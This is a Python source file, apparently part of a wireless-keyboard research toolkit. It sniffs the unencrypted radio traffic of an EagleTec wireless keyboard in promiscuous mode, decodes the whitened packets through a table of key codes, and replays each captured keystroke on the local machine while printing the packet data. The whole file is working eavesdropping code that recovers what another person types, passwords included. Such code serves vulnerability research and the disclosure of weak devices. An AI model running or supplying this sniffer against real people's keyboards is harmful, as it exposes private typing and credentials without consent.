import time
from pynput.keyboard import Controller, Listener, Key, KeyCode
from ..general_utils import *

CHANNEL = 26
RF_RATE_1M = 1
POSTAMBLE = 0xFF
PACKET_LEN = 10
WHITENING_BYTE = 0x5A
KEY_STATE_DOWN = 0x81
KEY_STATE_UP = 0x01
KEYPRESS_FRAME_TYPE = 0x07

message = ""

eagletec_codes = {
    0x08: Key.pause,
    0x0C: Key.ctrl_r,
    0x0E: Key.ctrl_l,
    0x0F: Key.f5,
    0x10: 'q',
    0x11: Key.tab,
    0x12: 'a',
    0x13: Key.esc,
    0x14: 'z',
    0x16: '`',
    0x17: '1',
    0x18: 'w',
    0x19: Key.caps_lock,
    0x1A: 's',
    0x1C: 'x',
    0x1E: Key.f1,
    0x1F: '2',
    0x20: 'e',
    0x21: Key.f3,
    0x22: 'd',
    0x23: Key.f4,
    0x24: 'c',
    0x26: Key.f2,
    0x27: '3',
    0x28: 'r',
    0x29: 't',
    0x2A: 'f',
    0x2B: 'g',
    0x2C: 'v',
    0x2D: 'b',
    0x2E: '5',
    0x2F: '4',
    0x30: 'u',
    0x31: 'y',
    0x32: 'j',
    0x33: 'h',
    0x34: 'm',
    0x35: 'n',
    0x36: '6',
    0x37: '7',
    0x38: 'i',
    0x39: ']',
    0x3A: 'k',
    0x3B: Key.f6,
    0x3C: ',',
    0x3E: '=',
    0x3F: '8',
    0x40: 'o',
    0x41: Key.f7,
    0x42: 'l',
    0x44: '.',
    0x45: Key.menu,
    0x46: Key.f8,
    0x47: '9',
    0x48: 'p',
    0x49: '[',
    0x4A: ';',
    0x4B: "'",
    0x4D: '/',
    0x4E: '-',
    0x4F: '0',
    0x50: Key.scroll_lock,
    0x53: Key.alt_l,
    0x55: Key.alt_r,
    0x57: Key.print_screen,
    0x59: Key.backspace,
    0x5A: '\\',
    0x5B: Key.f11,
    0x5C: Key.enter,
    0x5D: Key.f12,
    0x5E: Key.f9,
    0x5F: Key.f10,
    0x60: VK_NUMPAD7,
    0x61: VK_NUMPAD4,
    0x62: VK_NUMPAD1,
    0x63: Key.space,
    0x64: Key.num_lock,
    0x65: Key.down,
    0x66: Key.delete,
    0x68: VK_NUMPAD8,
    0x69: VK_NUMPAD5,
    0x6A: VK_NUMPAD2,
    0x6B: VK_NUMPAD0,
    0x6C: VK_DIVIDE,
    0x6D: Key.right,
    0x6E: Key.insert,
    0x70: VK_NUMPAD9,
    0x71: VK_NUMPAD6,
    0x72: VK_NUMPAD3,
    0x73: VK_DECIMAL,
    0x74: VK_MULTIPLY,
    0x75: VK_SUBTRACT,
    0x76: Key.page_up,
    0x77: Key.page_down,
    0x78: VK_ADD,
    0x7A: Key.enter, # Keypad ENTER
    0x7B: Key.up,
    0x7D: Key.left,
    0x7E: Key.home,
    0x7F: Key.end,
    0x81: Key.shift_l,
    0x82: Key.shift_r,
    0x89: Key.cmd_l,
    0x92: Key.cmd_r,
}

def get_key_name(key):
    try:
        if key.char:
            return key.char
        for k in list(pynput_dict.keys()):
            if isinstance(k, KeyCode) and key.vk == k.vk:
                return pynput_dict[k]
    except AttributeError:
        return pynput_dict[key]

def on_press(key):
    if message:
        print(message + f"    key {get_key_name(key)} pressed")

def on_release(key):
    if message:
        print(message + f"    key {get_key_name(key)} released")

def sniff(radio, address, duration):
    global message
    address_prefix = address[::-1]
    radio.enter_promiscuous_mode_generic(address_prefix, RF_RATE_1M)
    radio.set_channel(CHANNEL)

    start_time = time.time()

    keyboard = Controller()
    listener = Listener(on_press=on_press, on_release=on_release)
    listener.start()

    while time.time() - start_time < duration:
        value = radio.receive_payload()
        if value[0] == 0xFF:
            continue

        if POSTAMBLE in value and value.index(POSTAMBLE) == PACKET_LEN - 1:
            value = value[:PACKET_LEN]
            frame_type = (value[4] ^ WHITENING_BYTE) >> 4
            key_state = value[5] ^ WHITENING_BYTE
            key_code = value[6] ^ WHITENING_BYTE

            if (key_code ^ WHITENING_BYTE == 0x95) or (key_code not in eagletec_codes.keys()) or (frame_type != KEYPRESS_FRAME_TYPE):
                continue
            
            message = f"address: {format_bytes(address_prefix)}    packet: AA:AA:{format_bytes(value):<20}"
            pressed_key = eagletec_codes[key_code]
            if key_state == KEY_STATE_DOWN:
                keyboard.press(pressed_key)
            elif key_state == KEY_STATE_UP:
                keyboard.release(pressed_key)

    listener.stop()
    for modifier in pynput_modifiers:
        keyboard.release(modifier)
